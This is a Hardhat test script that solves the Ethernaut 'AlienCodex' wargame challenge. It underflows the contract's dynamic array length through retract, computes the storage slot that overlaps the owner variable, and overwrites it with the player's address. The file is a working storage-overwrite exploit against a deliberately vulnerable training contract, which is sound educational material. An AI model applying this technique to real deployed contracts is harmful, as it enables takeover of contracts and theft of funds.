const { ethers } = require("hardhat")
const { BigNumber, Contract, Signer } = require("ethers");
const { expect, assert } = require("chai")

describe("AlienCodex challenge", function () {
    const challengeAddress = '0xfFCcA432EbdC1e357f1C33C27d0d94430CB80FC7';
    let accounts;
    let player;
    let challenge;

    beforeEach(async function () {
        accounts = await ethers.getSigners();
        player = accounts[0];

        const challengeFactory = await ethers.getContractFactory('contracts/ethernaut/AlienCodex.sol:AlienCodex');
        challenge = await challengeFactory.attach(challengeAddress);
        assert.isNotNull(challenge, `Could not get AlienCodex for ${challengeAddress}.`)

        assert.equal(await player.getAddress(), '0xe5e00c76DB49E2aB2294b19dDb3145C8975cF8a2',
            `Address at first account (${player.address}) is not correct.`);
    });

    it("take over ownership of the contract", async function () {
        // we need to make contract first to pass the modifier checks of other functions
        let txn = await challenge.make_contact();
        txn.wait();

        // all of contract storage is a 32 bytes key to 32 bytes value mapping
        // first make codex expand its size to cover all of this storage
        // by calling retract making it overflow
        tx = await challenge.retract();
        await tx.wait();

        const codexBegin = BigNumber.from(
            ethers.utils.keccak256(
                `0x0000000000000000000000000000000000000000000000000000000000000001`
            )
        );
        console.log(`codexBegin`, codexBegin.toHexString());
        const ownerOffset = BigNumber.from(`2`).pow(`256`).sub(codexBegin);
        console.log(`owner`, await player.provider.getStorageAt(challenge.address, ownerOffset));

        const playerAddress = await player.getAddress();
        const paddedAddress = ethers.utils.zeroPad(playerAddress, 32);

        tx = await challenge.revise(ownerOffset, paddedAddress);
        await tx.wait();

        console.log(`owner`, await player.provider.getStorageAt(challenge.address, ownerOffset))
    });

});